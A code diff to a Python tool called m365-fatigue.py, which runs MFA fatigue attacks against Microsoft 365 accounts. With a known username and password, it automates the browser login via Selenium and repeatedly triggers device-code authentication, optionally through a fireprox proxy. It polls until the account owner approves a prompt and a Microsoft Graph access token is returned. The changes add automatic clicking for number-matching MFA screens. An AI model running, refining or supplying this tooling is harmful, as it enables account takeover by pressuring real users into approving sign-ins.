@@ -76,9 +76,9 @@ def login_automation(driver, code=None, user=None, password=None, fireprox_url=N
         print("Password field not found within 10 seconds")
 
 # Poll for access token using device code
-def init_polling(client_id, user_code, username, interval, device_code, headers, fireprox_url=None):
+def init_polling(driver, client_id, user_code, username, interval, device_code, headers, fireprox_url=None):
 
-# TODO Function needs to be called with driver object and eventually click on the "next" link via selenium in case of Pushnumber MFA 
+# TODO Function needs to be called with driver object and eventually click on the "next" link via selenium in case of Number MFA 
 
     access_token = None
     start_time = time.time()
@@ -86,11 +86,25 @@ def init_polling(client_id, user_code, username, interval, device_code, headers,
     remaining_time = time_limit
 
     while time.time() - start_time < time_limit:
+        
+        sbmt_button = driver.find_elements(By.ID, "idSIButton9")
+        
+        if sbmt_button:
+            for button in sbmt_button:
+                if "display: none;" not in button.get_attribute("style"):    
+                    button.click()
+                    break
+            else:
+                pass
+        else:
+            pass
+        
+
         token_body = {
             "client_id": client_id,
             "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
             "code": device_code,
-            "scope": "openid"  # Replace with desired scope
+            "scope": "openid"
         }
 
         try:
@@ -155,8 +169,8 @@ def init_polling(client_id, user_code, username, interval, device_code, headers,
 if __name__ == "__main__":
     # Azure AD / Microsoft identity platform app configuration
     client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-    resource = "https://graph.microsoft.com"
-    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042"  # Replace with your user agent string
+    resource = "https://graph.microsoft.com" 
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042"
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": user_agent
@@ -190,7 +204,7 @@ if __name__ == "__main__":
         print("Usage:")
         print("python3 m365-fatigue.py --user <username> [--password <password>] [--interval <seconds> (default: 60)]\n")
         print("Password will be prompted if not supplied directly!\n")
-        
+
         sys.exit()
 
     driver = webdriver.Chrome()
@@ -202,7 +216,7 @@ if __name__ == "__main__":
     
         login_automation(driver, user_code, user, password, fireprox_url)
     
-        if init_polling(client_id, user_code, user, interval, device_code, headers, fireprox_url):
+        if init_polling(driver, client_id, user_code, user, interval, device_code, headers, fireprox_url):
             break
     
     print("Exiting...")
